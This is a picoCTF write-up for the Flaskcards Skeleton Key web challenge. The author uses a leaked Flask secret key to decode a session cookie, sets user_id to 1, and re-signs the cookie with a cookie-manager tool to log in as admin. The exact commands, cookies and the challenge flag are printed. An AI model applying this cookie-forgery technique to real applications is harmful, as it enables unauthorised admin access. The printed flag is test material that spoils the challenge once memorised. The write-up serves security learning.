# Flaskcards Skeleton Key - Web

> Nice! You found out they were sending the Secret_key: 385c16dd09098b011d0086f9e218a0a2. Now, can you find a way to log in as admin?

This page is the same as the last challenge Flaskcards but now we have to login as admin. If I intercept the request to /admin, we see our user has a session cookie that contains the value
```.eJwlj0tqAzEQBe-itRdSt1rd8mWG_okYQwIz9irk7hak9q949VuOdeb1Ve6v8523cjyi3MvC4CmAA5QqklCOmsRDUYmGs6U1BpsNR53VyGu34FzmQgTGS4cYdeQaEI15NjAdEISunXoPJRZSTRyRhjKEoQk7L5e6Kbfi17mO188zv_efbOC-mFwmhKQDixNDInDTreW25jbh3r2vPP8jqPx9AAZePd0.DpA5UQ.ALSxhNUvHq8TDSk0gxcmee3A56E```

With the secret_key that we got in the problem description, I directly thought of this as a Flask cookie because the name of the title and that we have to modify it to get logged in as admin. Then I google about how to decode flask cookies and I find this [tool](https://github.com/noraj/flask-session-cookie-manager).

To decode the cookie with the secret key, I run:
```python2 session_cookie_manager.py decode -c ".eJwlj0tqAzEQBe-itRdSt1rd8mWG_okYQwIz9irk7hak9q949VuOdeb1Ve6v8523cjyi3MvC4CmAA5QqklCOmsRDUYmGs6U1BpsNR53VyGu34FzmQgTGS4cYdeQaEI15NjAdEISunXoPJRZSTRyRhjKEoQk7L5e6Kbfi17mO188zv_efbOC-mFwmhKQDixNDInDTreW25jbh3r2vPP8jqPx9AAZePd0.DpA5UQ.ALSxhNUvHq8TDSk0gxcmee3A56E" -s "385c16dd09098b011d0086f9e218a0a2"```

This gives us the cookie:
```{u'csrf_token': u'e12ccf75c892d8ec278c572e3271a2d571f96de3', u'_fresh': True, u'user_id': u'5', u'_id': u'f3d7982362a503585e60e576a3a556c7beb172b9136090b5c04bd7efbc8552b7fa68b54370d2d177912ba62d53ca4544da5785aae36deb386872187c7fc80000'}```

Now we need to modify it in some way so we get the admin cookie and first thing I tried was to change user_id to 1. Therefore we run the same tool to encode the new cookie now:
```python2 session_cookie_manager.py encode -s "385c16dd09098b011d0086f9e218a0a2" -t "{u'csrf_token': u'e12ccf75c892d8ec278c572e3271a2d571f96de3', u'_fresh': True, u'user_id': u'1', u'_id': u'f3d7982362a503585e60e576a3a556c7beb172b9136090b5c04bd7efbc8552b7fa68b54370d2d177912ba62d53ca4544da5785aae36deb386872187c7fc80000'}"```

This gives us the following encoded cookie
```.eJwlj0FqQzEMBe_idRaWZFlyLvORZJmGQAv_J6vSu8fQ2b_hzW851pnXV7m_znfeyvGY5V4WTRmK1NG4Eitnr8nSjYy5h3g6CPoA6nVU56jNp-TyUGZ0WdbVuZHUiRNEBqBbx8kU1ri1aSzKZkl9ppN2FQSVkBVaN-VW4jrX8fp55vf-k4ARSzh04NQMFA0WTEIB21qBNbaJ9u595fkfAeXvAwZSPdk.DpA9OQ.5l1RizweQvHgB2wM4YgXbavp40U```

This looks like the same format as the one we started with which is great. Then I change my cookie to that one and get logged in admin. Then the flag is: picoCTF{1_id_to_rule_them_all_d77c1ed6} 